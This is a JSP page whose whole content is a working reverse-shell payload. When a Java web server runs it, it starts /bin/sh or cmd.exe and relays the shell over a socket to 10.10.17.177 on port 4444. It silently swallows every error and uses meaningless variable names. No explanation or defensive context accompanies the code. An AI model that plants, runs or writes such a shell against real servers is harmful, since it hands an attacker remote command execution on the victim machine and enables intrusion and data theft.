<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream zd;
    OutputStream jc;

    StreamConnector( InputStream zd, OutputStream jc )
    {
      this.zd = zd;
      this.jc = jc;
    }

    public void run()
    {
      BufferedReader hk  = null;
      BufferedWriter iiu = null;
      try
      {
        hk  = new BufferedReader( new InputStreamReader( this.zd ) );
        iiu = new BufferedWriter( new OutputStreamWriter( this.jc ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = hk.read( buffer, 0, buffer.length ) ) > 0 )
        {
          iiu.write( buffer, 0, length );
          iiu.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( hk != null )
          hk.close();
        if( iiu != null )
          iiu.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.17.177", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
